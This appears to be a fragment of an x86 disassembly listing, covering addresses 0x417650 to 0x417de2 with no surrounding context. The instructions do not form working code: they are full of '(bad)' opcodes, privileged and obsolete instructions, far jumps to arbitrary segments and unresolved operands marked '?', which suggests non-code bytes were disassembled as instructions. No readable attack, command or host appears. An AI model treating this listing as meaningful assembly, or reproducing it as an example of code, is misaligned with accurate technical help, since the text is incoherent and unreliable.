  417650:	das    
  417651:	inc    eax
  417652:	fcmove st,st(0)
  417654:	sub    BYTE PTR [eax-0x53],dl
  417657:	ds aad 0x1a
  41765a:	xor    eax,ecx
  41765c:	sub    eax,0x11c590a8
  417661:	retf   
  417662:	dec    ebp
  417663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417664:	imul   edx,DWORD PTR [ebx+eax*4-0x65],0xffffffc3
  417669:	xchg   bl,ah
  41766b:	sti    
  41766c:	push   es
  41766d:	xchg   ecx,eax
  41766e:	push   ecx
  41766f:	jle    0x417621
  417671:	dec    eax
  417672:	mov    ds:0x6facab66,al
  417677:	add    DWORD PTR [ebp+edx*8-0x29],edi
  41767b:	and    cl,ch
  41767d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41767e:	mov    bh,0xe7
  417680:	xor    eax,0x1e82dbef
  417685:	fcmovnb st,st(4)
  417687:	clc    
  417688:	jle    0x417668
  41768a:	(bad)  
  41768b:	xchg   BYTE PTR [eax-0x7bb456ee],ah
  417691:	mov    cx,0x2921
  417695:	shr    DWORD PTR [edx+0x42],cl
  417698:	mov    eax,DWORD PTR [edx]
  41769a:	push   ecx
  41769b:	pushf  
  41769c:	loopne 0x417644
  41769e:	push   ebx
  41769f:	sbb    esi,DWORD PTR [ecx]
  4176a1:	mov    bh,0xb8
  4176a3:	xchg   ebx,eax
  4176a4:	jo     0x417660
  4176a6:	push   esi
  4176a7:	test   BYTE PTR [esi+eax*2],0x31
  4176ab:	push   ds
  4176ac:	gs dec ebp
  4176ae:	mov    eax,ds:0x29faafc1
  4176b3:	imul   ebp,DWORD PTR [eax+0x41452f6e],0x63
  4176ba:	xor    eax,0x27bc562e
  4176bf:	sar    bl,cl
  4176c1:	daa    
  4176c2:	js     0x41765c
  4176c4:	jnp    0x417732
  4176c6:	repz mov bh,0x83
  4176c9:	dec    ecx
  4176ca:	push   ebp
  4176cb:	je     0x417673
  4176cd:	or     DWORD PTR [ebx],esp
  4176cf:	outs   dx,BYTE PTR ds:[esi]
  4176d0:	mov    al,0x48
  4176d2:	fistp  QWORD PTR [esi-0x55]
  4176d5:	cmp    eax,0x7cdc2163
  4176da:	imul   eax,ecx,0x53231760
  4176e0:	sar    dh,0x68
  4176e3:	or     eax,0x7ba5e291
  4176e8:	lods   al,BYTE PTR ds:[esi]
  4176e9:	xor    ch,BYTE PTR gs:[esi+0x62]
  4176ed:	int3   
  4176ee:	clc    
  4176ef:	cwde   
  4176f0:	push   esi
  4176f1:	stc    
  4176f2:	dec    esi
  4176f3:	adc    ebx,DWORD PTR [edx+edi*1-0x4804a25e]
  4176fa:	lods   al,BYTE PTR ds:[esi]
  4176fb:	xor    edi,edi
  4176fd:	cmp    cl,BYTE PTR [ecx-0xec1a1a2]
  417703:	test   bh,0x3d
  417706:	or     dh,dh
  417708:	mov    ebx,0xf209bbec
  41770d:	push   ds
  41770e:	aad    0x44
  417710:	mov    esi,0xe66ad986
  417715:	push   ss
  417716:	dec    edx
  417717:	hlt    
  417718:	ds clc 
  41771a:	mov    ch,0xb0
  41771c:	and    ecx,eax
  41771e:	dec    ecx
  41771f:	addr16 mov esp,0xf96463b8
  417725:	and    BYTE PTR [eax],ch
  417727:	jns    0x417757
  417729:	pop    eax
  41772a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41772b:	sub    bh,dh
  41772d:	(bad)  
  41772e:	(bad)  
  41772f:	shr    DWORD PTR [esi+ebp*1-0x73],1
  417733:	fxch   st(5)
  417735:	aad    0x95
  417737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417738:	xor    BYTE PTR [esi+0x6b],cl
  41773b:	stos   DWORD PTR es:[edi],eax
  41773c:	das    
  41773d:	add    eax,0x60bbd1d1
  417742:	ret    
  417743:	cmp    DWORD PTR [eax-0x25a0d115],ebx
  417749:	mov    al,0xbb
  41774b:	out    dx,eax
  41774c:	cld    
  41774d:	mov    cs,ecx
  41774f:	pop    ecx
  417750:	ds dec eax
  417752:	xchg   ebp,eax
  417753:	lods   al,BYTE PTR ds:[esi]
  417754:	mov    eax,ds:0xa49edc93
  417759:	loope  0x4177a5
  41775b:	fild   WORD PTR [ebp+0x31]
  41775e:	xchg   ebp,eax
  41775f:	aas    
  417760:	xchg   ecx,eax
  417761:	fdiv   DWORD PTR [esp+ebx*4]
  417764:	ret    
  417765:	mov    ebx,0x81c6b395
  41776a:	or     al,0x36
  41776c:	fidiv  DWORD PTR [edi-0x1f]
  41776f:	add    DWORD PTR [edx+eiz*4],0xffffff9b
  417773:	adc    BYTE PTR [ebx],0x4b
  417776:	xchg   esi,eax
  417777:	mov    dh,0x65
  417779:	mov    cl,0xc6
  41777b:	pusha  
  41777c:	jl     0x417770
  41777e:	aam    0xfb
  417780:	imul   esp,DWORD PTR [eax-0x13a08a2e],0xb6785676
  41778a:	ds push ebp
  41778c:	or     ebp,DWORD PTR ds:0xd0ce1f0c
  417792:	fprem  
  417794:	out    0x2a,eax
  417796:	cmc    
  417797:	push   ebx
  417798:	sbb    BYTE PTR [eax],bh
  41779a:	cli    
  41779b:	stc    
  41779c:	pop    esi
  41779d:	div    BYTE PTR [ecx-0x554122fb]
  4177a3:	pop    es
  4177a4:	call   0x3353038c
  4177a9:	test   BYTE PTR [edx],ch
  4177ab:	sbb    al,0x55
  4177ad:	imul   edi,DWORD PTR [edi-0x7b540981],0xd7d6895
  4177b7:	add    BYTE PTR [edi+0x1c],ah
  4177ba:	sahf   
  4177bb:	cmp    esi,DWORD PTR [esi-0x61]
  4177be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177bf:	or     DWORD PTR [eax-0xb],0x3a
  4177c3:	dec    BYTE PTR [ecx-0x20b200c1]
  4177c9:	in     al,0xa6
  4177cb:	xor    DWORD PTR [ebx],esp
  4177cd:	shl    dh,1
  4177cf:	nop
  4177d0:	lock push ebx
  4177d2:	sbb    eax,0x5a7d2542
  4177d7:	mov    al,ds:0xa7b002ad
  4177dc:	inc    eax
  4177dd:	or     edx,esp
  4177df:	mov    ch,0xba
  4177e1:	jb     0x4177c4
  4177e3:	cmp    DWORD PTR [ebx+edx*1-0xe3f965b],ebx
  4177ea:	push   ss
  4177eb:	retf   
  4177ec:	mov    ebp,DWORD PTR [ecx-0x432a3601]
  4177f2:	and    al,0xc3
  4177f4:	cmc    
  4177f5:	jb     0x41777e
  4177f7:	dec    edx
  4177f8:	(bad)  
  4177fa:	xor    cl,BYTE PTR [ecx+0x7fe9d4ca]
  417800:	push   ds
  417801:	ret    0x9a5a
  417804:	xchg   esi,eax
  417805:	cmp    eax,0x1cd687ea
  41780a:	add    ecx,edi
  41780c:	cwde   
  41780d:	sti    
  41780e:	adc    eax,0x9448f3c2
  417813:	xchg   edi,edx
  417815:	loopne 0x417894
  417817:	js     0x417829
  417819:	in     eax,dx
  41781a:	adc    al,0x6f
  41781c:	div    BYTE PTR [esi-0x4e]
  41781f:	dec    ecx
  417820:	jae    0x417879
  417822:	and    eax,0x6c1a2863
  417827:	mov    WORD PTR [ecx+0x5d397ab3],ss
  41782d:	in     eax,dx
  41782e:	jle    0x417882
  417830:	xrelease xchg BYTE PTR [edi-0x68],bl
  417834:	sub    ch,BYTE PTR [esi+0x2e]
  417837:	adc    DWORD PTR [eax+0x1eb833a6],esi
  41783d:	xlat   BYTE PTR ds:[ebx]
  41783e:	stos   BYTE PTR es:[edi],al
  41783f:	shr    BYTE PTR [esi],1
  417841:	mov    ah,0x88
  417843:	fs push eax
  417845:	(bad)  
  417846:	cmc    
  417847:	(bad)  
  417848:	fidiv  WORD PTR [ecx-0x53]
  41784b:	cdq    
  41784c:	dec    ecx
  41784d:	inc    DWORD PTR [esi]
  41784f:	sbb    BYTE PTR [edi],0x93
  417852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417853:	mov    dl,0xbf
  417855:	in     al,0x74
  417857:	out    0x33,eax
  417859:	lods   al,BYTE PTR ds:[esi]
  41785a:	cwde   
  41785b:	test   ebp,edx
  41785d:	push   eax
  41785e:	xchg   ebp,eax
  41785f:	cwde   
  417860:	pop    es
  417861:	and    dl,dh
  417863:	invd   
  417865:	mov    ebp,0xb790143c
  41786a:	inc    BYTE PTR [ebp-0x32]
  41786d:	daa    
  41786e:	jno    0x417804
  417870:	xchg   ecx,eax
  417871:	jge    0x41788d
  417873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417874:	xchg   ebx,eax
  417875:	enter  0x767d,0x9
  417879:	sbb    dl,ch
  41787b:	xchg   esi,eax
  41787c:	pusha  
  41787d:	cmp    DWORD PTR [esi+0x31],ebx
  417880:	(bad)  
  417881:	fst    DWORD PTR ds:0xdac2c1c3
  417887:	xchg   ecx,eax
  417888:	in     al,dx
  417889:	outs   dx,BYTE PTR ds:[esi]
  41788a:	les    edi,FWORD PTR [ecx]
  41788c:	sti    
  41788d:	lock adc edi,DWORD PTR [ecx+edi*2-0x44f31047]
  417895:	pop    eax
  417896:	fcomip st,st(4)
  417898:	call   0x81ea:0xc6128db9
  41789f:	mov    eax,ds:0x1a1650f7
  4178a4:	ret    
  4178a5:	jmp    0x68eb:0x36d2b184
  4178ac:	mov    dl,ch
  4178ae:	or     BYTE PTR [edx-0x292e427c],dh
  4178b4:	out    dx,al
  4178b5:	repnz fldln2 
  4178b8:	push   ebp
  4178b9:	jae    0x41792e
  4178bb:	popf   
  4178bc:	xor    eax,0xc9155c7c
  4178c1:	xchg   ecx,eax
  4178c2:	xchg   ebp,eax
  4178c3:	add    DWORD PTR ds:0x90bbea8c,edi
  4178c9:	loopne 0x417935
  4178cb:	or     al,0x51
  4178cd:	lea    esi,[edx]
  4178cf:	hlt    
  4178d0:	and    ecx,DWORD PTR [edi-0x11]
  4178d3:	test   al,0x4d
  4178d5:	lahf   
  4178d6:	ss cs or esi,ebp
  4178da:	xchg   esp,eax
  4178db:	sbb    DWORD PTR ds:0x8c76a587,esi
  4178e1:	lahf   
  4178e2:	in     eax,0xbf
  4178e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178e5:	aaa    
  4178e6:	les    ebp,FWORD PTR [eax+esi*4+0x4936063b]
  4178ed:	cs gs pop ebp
  4178f0:	arpl   WORD PTR [edx],di
  4178f2:	ror    BYTE PTR [eax],0x84
  4178f5:	jne    0x417933
  4178f7:	xor    BYTE PTR ds:0x5f6f51da,bl
  4178fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178fe:	xor    eax,0x10452885
  417903:	xchg   ecx,eax
  417904:	jnp    0x41789a
  417906:	or     DWORD PTR [esi-0x37],esi
  417909:	fsub   QWORD PTR [ebp+0x16]
  41790c:	pop    es
  41790d:	int    0xc3
  41790f:	inc    ebx
  417910:	mov    edx,DWORD PTR [ecx-0x5d]
  417913:	push   edx
  417914:	cmp    DWORD PTR ds:0x9e26e706,eax
  41791a:	in     al,dx
  41791b:	loope  0x41798d
  41791d:	mov    dh,BYTE PTR [ebx-0x1735274a]
  417923:	sbb    dl,BYTE PTR [eax]
  417925:	push   esp
  417926:	push   edx
  417927:	sub    DWORD PTR [ebp-0x37],eax
  41792a:	mov    bh,0xd8
  41792c:	dec    eax
  41792d:	lea    ebx,[ecx]
  41792f:	mov    edx,0x7124df49
  417934:	lods   al,BYTE PTR ds:[esi]
  417935:	jb     0x417966
  417937:	push   0x74bd1488
  41793c:	sub    bh,dl
  41793e:	jae    0x41798e
  417940:	clc    
  417941:	aas    
  417942:	dec    ecx
  417943:	cwde   
  417944:	iret   
  417945:	(bad)  
  417946:	push   edx
  417947:	(bad)  
  417948:	lahf   
  417949:	xchg   ebx,eax
  41794a:	push   ds
  41794b:	xchg   edi,eax
  41794c:	fxtract 
  41794e:	out    dx,eax
  41794f:	lea    ebx,[edi+0xb17fff5]
  417955:	imul   edi,edx,0x26
  417958:	and    DWORD PTR [esi],0x23
  41795b:	and    BYTE PTR [edi+eax*1],dl
  41795e:	pushf  
  41795f:	aas    
  417960:	fistp  QWORD PTR ss:[ebx-0x46]
  417964:	add    ecx,esp
  417966:	lods   eax,DWORD PTR ds:[esi]
  417967:	push   es
  417968:	push   ebp
  417969:	popf   
  41796a:	cwde   
  41796b:	dec    eax
  41796c:	lock push ds
  41796e:	pop    ebp
  41796f:	mov    eax,0x3f89b2c5
  417974:	je     0x41790d
  417976:	dec    eax
  417977:	jns    0x4179e3
  417979:	test   eax,0x56d0f6b7
  41797e:	sbb    eax,0xa5c9a23b
  417983:	sbb    ebp,DWORD PTR [ebx-0x6b]
  417986:	jl     0x417a05
  417988:	test   BYTE PTR [esi+0x32],al
  41798b:	inc    ebx
  41798c:	repnz adc dh,BYTE PTR [edi+0x629e1657]
  417993:	mov    edi,0xf89e844f
  417998:	clc    
  417999:	ficom  WORD PTR [esp+ebx*2-0x77]
  41799d:	add    DWORD PTR [edx-0x27],ebp
  4179a0:	enter  0xc8a9,0x5
  4179a4:	ins    DWORD PTR es:[edi],dx
  4179a5:	mov    edx,0xcd8311cc
  4179aa:	inc    edi
  4179ab:	dec    ecx
  4179ac:	scas   al,BYTE PTR es:[edi]
  4179ad:	daa    
  4179ae:	in     eax,0x75
  4179b0:	pop    edx
  4179b1:	adc    eax,0x6e32b92
  4179b6:	rol    ah,cl
  4179b8:	push   0xd706f728
  4179bd:	mov    eax,0xec168ce9
  4179c2:	test   DWORD PTR [edi+0x187a1310],edx
  4179c8:	cmp    BYTE PTR [eax*8+0x33f6c82],0xa8
  4179d0:	mov    esi,fs
  4179d2:	hlt    
  4179d3:	push   ebp
  4179d4:	jnp    0x417a2b
  4179d6:	cld    
  4179d7:	cmp    DWORD PTR [esi+0x43ba9293],edi
  4179dd:	xor    BYTE PTR [ecx],dl
  4179df:	add    bl,BYTE PTR [edi]
  4179e1:	mov    ds:0xa74e1c05,eax
  4179e6:	and    esp,DWORD PTR [edi+0x76]
  4179e9:	mov    dh,0xe8
  4179ec:	inc    edx
  4179ed:	aad    0xca
  4179ef:	push   ds
  4179f0:	lods   al,BYTE PTR ds:[esi]
  4179f1:	stc    
  4179f2:	push   ds
  4179f3:	dec    edx
  4179f4:	lea    ebx,[eax+0x63f3f3c7]
  4179fa:	leave  
  4179fb:	dec    edi
  4179fc:	aas    
  4179fd:	sbb    al,0x50
  4179ff:	imul   esp,edx,0x3b
  417a02:	lods   al,BYTE PTR ds:[esi]
  417a03:	loope  0x417a60
  417a05:	(bad)  
  417a06:	cmp    DWORD PTR [ecx],esp
  417a08:	cmp    eax,0x5471dc0
  417a0d:	sub    al,BYTE PTR [ebp+0x34]
  417a10:	nop
  417a11:	push   ds
  417a12:	je     0x417a5b
  417a14:	push   esi
  417a15:	add    eax,0x9f018963
  417a1a:	adc    DWORD PTR [ebp+0x11],ebp
  417a1d:	retf   0x6360
  417a20:	je     0x417a24
  417a22:	jne    0x4179fd
  417a24:	mov    ecx,0xd6f6c449
  417a29:	pop    esp
  417a2a:	sub    eax,0x76ae0b6
  417a2f:	xchg   ebp,eax
  417a30:	clc    
  417a31:	or     BYTE PTR [ebp+eiz*8-0x3c],ch
  417a35:	setle  BYTE PTR [edx]
  417a38:	inc    ecx
  417a39:	int    0xf
  417a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a3c:	add    dh,dl
  417a3e:	inc    edx
  417a3f:	pop    ebp
  417a40:	sub    edi,DWORD PTR [eax+0x3e]
  417a43:	lods   eax,DWORD PTR ds:[esi]
  417a44:	std    
  417a45:	ja     0x417a74
  417a47:	(bad)  
  417a48:	ins    DWORD PTR es:[edi],dx
  417a49:	jno    0x417a6c
  417a4b:	jp     0x417a33
  417a4d:	add    eax,0x6d395888
  417a52:	enter  0xdf63,0x35
  417a56:	jmp    FWORD PTR [ebx-0x4e]
  417a59:	and    al,0xcc
  417a5b:	std    
  417a5c:	loop   0x417a4b
  417a5e:	sahf   
  417a5f:	or     al,0x3a
  417a61:	popa   
  417a62:	sub    DWORD PTR [edx],ebp
  417a64:	aaa    
  417a65:	sub    al,BYTE PTR [ebx+0xfb68fd6]
  417a6b:	xchg   esi,eax
  417a6c:	fmul   DWORD PTR [esi+0x13]
  417a6f:	mov    bh,0x67
  417a71:	jg     0x417a5d
  417a73:	dec    esi
  417a74:	enter  0xdc72,0x49
  417a78:	clc    
  417a79:	pop    es
  417a7a:	test   BYTE PTR [ebx+0x5bd98f9],ch
  417a80:	mov    gs,WORD PTR [esi-0x24fa148b]
  417a86:	into   
  417a87:	pop    ds
  417a88:	jb     0x417ac8
  417a8a:	mov    dh,0x10
  417a8c:	and    bh,al
  417a8e:	mov    edi,es
  417a90:	mov    ebx,0xa339613c
  417a95:	gs scas eax,DWORD PTR es:[edi]
  417a97:	push   ecx
  417a98:	sub    ah,BYTE PTR [ebx-0x51d94c51]
  417a9e:	cs xor eax,0x949da387
  417aa4:	or     ah,al
  417aa6:	es iret 
  417aa8:	jl     0x417af9
  417aaa:	and    edx,esp
  417aac:	int3   
  417aad:	je     0x417a50
  417aaf:	inc    esp
  417ab0:	add    bh,dl
  417ab2:	retf   
  417ab3:	or     edi,DWORD PTR [ecx+0x5f]
  417ab6:	push   ecx
  417ab7:	mov    gs,WORD PTR [esi]
  417ab9:	xor    BYTE PTR [edi],ah
  417abb:	iret   
  417abc:	xchg   ecx,eax
  417abd:	scas   al,BYTE PTR es:[edi]
  417abe:	pop    ecx
  417abf:	pop    esp
  417ac0:	lahf   
  417ac1:	jae    0x417a77
  417ac3:	cmp    eax,0xe7182ecd
  417ac8:	and    dl,BYTE PTR [ebx-0x31a37f55]
  417ace:	push   0xffffffcc
  417ad0:	int3   
  417ad1:	ins    DWORD PTR es:[edi],dx
  417ad2:	int3   
  417ad3:	lahf   
  417ad4:	sahf   
  417ad5:	xchg   edx,eax
  417ad6:	nop
  417ad7:	loope  0x417b51
  417ad9:	iret   
  417ada:	and    dh,dh
  417adc:	jno    0x417adf
  417ade:	push   ds
  417adf:	mov    eax,ds:0x7f80882a
  417ae4:	cs inc ecx
  417ae6:	mov    edi,0xaf4c8eb1
  417aeb:	mov    ebp,0x23e44bea
  417af0:	inc    ebx
  417af1:	pop    esi
  417af2:	push   ecx
  417af3:	test   eax,0x8f8a2e8
  417af8:	lea    esi,ds:0xb0c5b147
  417afe:	ds cmp al,0x42
  417b01:	pop    edx
  417b02:	jp     0x417b7d
  417b04:	repnz pop ss
  417b06:	test   al,0x8f
  417b08:	ins    DWORD PTR es:[edi],dx
  417b09:	mov    dl,0xba
  417b0b:	or     al,0xc2
  417b0d:	inc    esi
  417b0e:	xchg   ecx,eax
  417b0f:	jnp    0x417b0a
  417b11:	push   edi
  417b12:	jae    0x417b81
  417b14:	mov    ds:0x2d4407a5,eax
  417b19:	in     eax,0x17
  417b1b:	pop    esi
  417b1c:	jl     0x417b51
  417b1e:	in     al,0x70
  417b20:	pop    es
  417b21:	mov    esp,0xcf81cfc6
  417b26:	dec    edi
  417b27:	jg     0x417b83
  417b29:	(bad)  
  417b2a:	std    
  417b2b:	xchg   ecx,eax
  417b2c:	jmp    0x417b4c
  417b2e:	adc    ebx,DWORD PTR [eax+0x23]
  417b31:	dec    edi
  417b32:	ss ret 
  417b34:	xor    bh,BYTE PTR [esi+edi*4-0x6a8a81a0]
  417b3b:	scas   al,BYTE PTR es:[edi]
  417b3c:	dec    esi
  417b3d:	int    0xe3
  417b3f:	add    edx,ebp
  417b41:	fadd   QWORD PTR [ebx+0x1b40641a]
  417b47:	nop
  417b48:	sbb    ebp,esp
  417b4a:	test   al,0xf4
  417b4c:	div    BYTE PTR [ebx-0x340ffaec]
  417b52:	mov    edx,DWORD PTR [ecx-0x5c47bcd1]
  417b58:	dec    ebp
  417b59:	or     eax,0x2a9b195d
  417b5e:	mov    dh,0xf6
  417b60:	jbe    0x417b18
  417b62:	adc    al,0x95
  417b64:	(bad)  
  417b65:	stc    
  417b66:	inc    ebp
  417b67:	call   0x4921aec4
  417b6c:	ja     0x417bd3
  417b6e:	test   eax,0xc18873ad
  417b73:	inc    ebx
  417b74:	jne    0x417bd1
  417b76:	xchg   edx,eax
  417b77:	fdiv   st,st(5)
  417b79:	add    BYTE PTR [ebp+eiz*8-0x3d],bl
  417b7d:	mov    ebx,?
  417b7f:	jns    0x417b34
  417b81:	fs aaa 
  417b83:	mov    edx,0x9f0b22d3
  417b88:	mov    ah,0x7b
  417b8a:	sbb    eax,0x52d3c437
  417b8f:	add    DWORD PTR [ebp+ebp*8+0x29],esp
  417b93:	leave  
  417b94:	sub    al,bl
  417b96:	lea    ebp,[ebx-0x29]
  417b99:	iret   
  417b9a:	loopne 0x417bce
  417b9c:	add    eax,0x7113cc72
  417ba1:	shl    BYTE PTR [eax+0x575db959],0xdf
  417ba8:	fldenv [ebp+0x6fe9e638]
  417bae:	xchg   ebx,eax
  417baf:	xchg   ecx,eax
  417bb0:	adc    DWORD PTR [esi+0x1],ecx
  417bb3:	faddp  st(5),st
  417bb5:	mov    al,ds:0x3912f25f
  417bba:	mov    dl,0xa7
  417bbc:	out    0xd3,al
  417bbe:	stc    
  417bbf:	outs   dx,DWORD PTR ds:[esi]
  417bc0:	imul   edi,DWORD PTR [ebp+0x7a],0xffffff9c
  417bc4:	les    esp,FWORD PTR [ebp-0x66]
  417bc7:	fisubr DWORD PTR [edi+eiz*8+0x1afe3adc]
  417bce:	mov    esi,0x29a2ce15
  417bd3:	std    
  417bd4:	push   ss
  417bd5:	retf   
  417bd6:	mov    ch,0x3e
  417bd8:	jmp    0xbd14:0xb827c054
  417bdf:	popa   
  417be0:	mov    edx,0x89d87ab9
  417be5:	jle    0x417c27
  417be7:	rol    edx,cl
  417be9:	repnz outs dx,BYTE PTR ds:[esi]
  417beb:	(bad)  
  417bec:	repz (bad) 
  417bee:	cmc    
  417bef:	lods   al,BYTE PTR ds:[esi]
  417bf0:	imul   eax
  417bf2:	mov    dl,0xdd
  417bf4:	into   
  417bf5:	pop    esi
  417bf6:	(bad)
  417bf9:	fndisi(8087 only) 
  417bfb:	ss inc ebx
  417bfd:	mov    WORD PTR [edx],ds
  417bff:	push   esp
  417c00:	lds    eax,FWORD PTR [ecx]
  417c02:	aam    0xf8
  417c04:	adc    ebp,DWORD PTR [ebx+ebx*2+0x458faa5b]
  417c0b:	stc    
  417c0c:	int    0x5
  417c0e:	jp     0x417c35
  417c10:	dec    eax
  417c11:	loopne 0x417bee
  417c13:	(bad)  
  417c15:	mov    cl,0x9b
  417c17:	std    
  417c18:	sbb    DWORD PTR [ecx+ebp*8+0x5a],ebx
  417c1c:	sub    al,0x60
  417c1e:	inc    ecx
  417c1f:	je     0x417c9d
  417c21:	into   
  417c22:	pop    edi
  417c23:	sbb    ecx,DWORD PTR [ecx]
  417c25:	xor    esp,DWORD PTR [esi]
  417c27:	push   edx
  417c28:	ret    0x271a
  417c2b:	scas   eax,DWORD PTR es:[edi]
  417c2c:	cmc    
  417c2d:	in     al,dx
  417c2e:	shl    esi,1
  417c30:	cwde   
  417c31:	xchg   ebp,eax
  417c32:	ja     0x417c65
  417c34:	addr16 add al,0xa2
  417c37:	mov    ds:0xc0cd456b,eax
  417c3c:	sbb    ebp,DWORD PTR gs:0x1d40c99b
  417c43:	fbstp  TBYTE PTR [esi+esi*1-0x625f4942]
  417c4a:	mov    ds:0x2fae545f,al
  417c4f:	jae    0x417c40
  417c51:	sahf   
  417c52:	fwait
  417c53:	lahf   
  417c54:	imul   ecx,DWORD PTR [esi],0xa627d742
  417c5a:	cli    
  417c5b:	push   ebp
  417c5c:	cdq    
  417c5d:	sbb    ah,BYTE PTR [edx+0x27]
  417c60:	push   esp
  417c61:	pop    esp
  417c62:	ja     0x417ca5
  417c64:	outs   dx,BYTE PTR ds:[esi]
  417c65:	pop    es
  417c66:	add    eax,0x346746c6
  417c6b:	rcl    edi,0x15
  417c6e:	mov    ecx,0xa99e7762
  417c73:	aas    
  417c74:	cmp    cl,0xc3
  417c77:	add    ebx,ebx
  417c79:	cmp    eax,0xc7aa0e01
  417c7e:	scas   al,BYTE PTR es:[edi]
  417c7f:	jno    0x417c56
  417c81:	loope  0x417c7a
  417c83:	daa    
  417c84:	mov    bl,0x89
  417c86:	push   es
  417c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c88:	hlt    
  417c89:	adc    edx,DWORD PTR [ecx+0x447dbd7d]
  417c8f:	outs   dx,BYTE PTR ds:[esi]
  417c90:	and    bl,BYTE PTR [ebp-0x357513cb]
  417c96:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417c98:	xchg   esi,eax
  417c99:	lods   eax,DWORD PTR ds:[esi]
  417c9a:	clc    
  417c9b:	dec    ecx
  417c9c:	sbb    al,0x2c
  417c9e:	dec    esp
  417c9f:	or     BYTE PTR [eax+0x49e6cb8f],cl
  417ca5:	jbe    0x417c33
  417ca7:	inc    edi
  417ca8:	sahf   
  417ca9:	push   ds
  417caa:	retf   0x5e1
  417cad:	cmc    
  417cae:	cmp    DWORD PTR [edx],ecx
  417cb0:	or     ch,BYTE PTR [ebx]
  417cb2:	into   
  417cb3:	inc    esi
  417cb4:	inc    esi
  417cb5:	cmp    ebx,ebx
  417cb7:	or     DWORD PTR ds:0xcf79b84d,esi
  417cbd:	fisub  WORD PTR [ebp-0x4bd99d15]
  417cc3:	daa    
  417cc4:	lods   al,BYTE PTR ds:[esi]
  417cc5:	addr16 imul edx,ebx,0xffffffcd
  417cc9:	in     eax,dx
  417cca:	xor    edx,DWORD PTR [ecx-0x2066aa1c]
  417cd0:	push   eax
  417cd1:	and    BYTE PTR [ebp+0x3d],al
  417cd4:	leave  
  417cd5:	ds xchg bh,cl
  417cd8:	xchg   edx,eax
  417cd9:	shl    DWORD PTR [eax],1
  417cdb:	stos   DWORD PTR es:[edi],eax
  417cdc:	mov    ecx,ss
  417cde:	data16 aam 0xd0
  417ce1:	pop    edi
  417ce2:	(bad)  
  417ce3:	xchg   ecx,eax
  417ce4:	rcl    DWORD PTR [edx-0xc39c8a4],cl
  417cea:	ins    BYTE PTR es:[edi],dx
  417ceb:	and    edx,DWORD PTR [ebx]
  417ced:	shr    dl,1
  417cef:	test   BYTE PTR [edx],ch
  417cf1:	sbb    eax,0xa81ec6f4
  417cf6:	jecxz  0x417cce
  417cf8:	mov    BYTE PTR [edi+ebp*8-0x655f7388],0x1f
  417d00:	imul   BYTE PTR [esi-0x694f254a]
  417d06:	inc    edi
  417d07:	mov    edx,?
  417d09:	push   cs
  417d0a:	adc    al,BYTE PTR [eax+0x30792c62]
  417d10:	adc    eax,0x24f62f82
  417d15:	lods   al,BYTE PTR ds:[esi]
  417d16:	int3   
  417d17:	test   al,0x5d
  417d19:	(bad)  
  417d1a:	pop    esi
  417d1b:	test   al,0xa
  417d1d:	das    
  417d1e:	into   
  417d1f:	adc    eax,0xea76f396
  417d24:	mov    cl,0x8a
  417d26:	cmp    ah,ah
  417d28:	and    eax,0xfdd3c103
  417d2d:	push   cs
  417d2e:	loopne 0x417d4b
  417d30:	xchg   ecx,eax
  417d31:	(bad)  
  417d32:	cmp    eax,0xed849192
  417d37:	xor    al,0x9a
  417d39:	out    0xd3,al
  417d3b:	fst    DWORD PTR [edi]
  417d3d:	stos   DWORD PTR es:[edi],eax
  417d3e:	iret   
  417d3f:	lahf   
  417d40:	lds    edi,FWORD PTR [esi-0x6713f6e7]
  417d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d47:	or     eax,DWORD PTR [esi+0x37957186]
  417d4d:	push   edx
  417d4e:	push   eax
  417d4f:	sar    BYTE PTR [edi+0x1c374d4b],1
  417d55:	les    ebx,FWORD PTR [ebx+0x7b19ec48]
  417d5b:	mov    eax,0x2cf072b7
  417d60:	ja     0x417d19
  417d62:	sub    al,0x8c
  417d64:	push   cs
  417d65:	fidiv  WORD PTR [edx+eax*2+0x5]
  417d69:	mov    ch,0x3b
  417d6b:	jno    0x417dea
  417d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d6e:	push   edx
  417d6f:	mov    ebx,DWORD PTR [bp+di-0x6f]
  417d73:	jmp    0x4db0:0x612eb239
  417d7a:	push   cs
  417d7b:	mov    esi,0x8ac3293b
  417d80:	setge  BYTE PTR [edi+ebx*8]
  417d84:	nop
  417d85:	test   DWORD PTR [ebx-0xb14bbfe],edx
  417d8b:	in     eax,0x55
  417d8d:	imul   ecx,DWORD PTR [eax],0x1c
  417d90:	retf   
  417d91:	lods   eax,DWORD PTR ds:[esi]
  417d92:	push   es
  417d93:	enter  0x1c2d,0x76
  417d97:	dec    ecx
  417d98:	pushf  
  417d99:	rcl    DWORD PTR [edx-0x1f628256],1
  417d9f:	fs cwde 
  417da1:	ja     0x417db3
  417da3:	out    dx,eax
  417da4:	xchg   edx,eax
  417da5:	sub    BYTE PTR [esi],0x79
  417da8:	push   ebx
  417da9:	scas   al,BYTE PTR es:[edi]
  417daa:	jg     0x417dc9
  417dac:	xchg   ebx,eax
  417dad:	inc    edx
  417dae:	or     DWORD PTR [edx-0x5009c6ee],ebp
  417db4:	adc    BYTE PTR [esi+0x246e1dcc],bl
  417dba:	xchg   BYTE PTR [eax+0x596715e7],cl
  417dc0:	mov    edi,0x98c3173c
  417dc5:	and    dl,cl
  417dc7:	cli    
  417dc8:	cmp    eax,0x771375c3
  417dcd:	sub    eax,DWORD PTR [ecx+0xa]
  417dd0:	ins    BYTE PTR es:[edi],dx
  417dd1:	dec    edi
  417dd2:	leave  
  417dd3:	loop   0x417dd9
  417dd5:	loope  0x417d61
  417dd7:	out    0x85,eax
  417dd9:	push   edx
  417dda:	mov    bh,0x86
  417ddc:	or     eax,0xa65f417b
  417de1:	pop    es
  417de2:	push   ecx
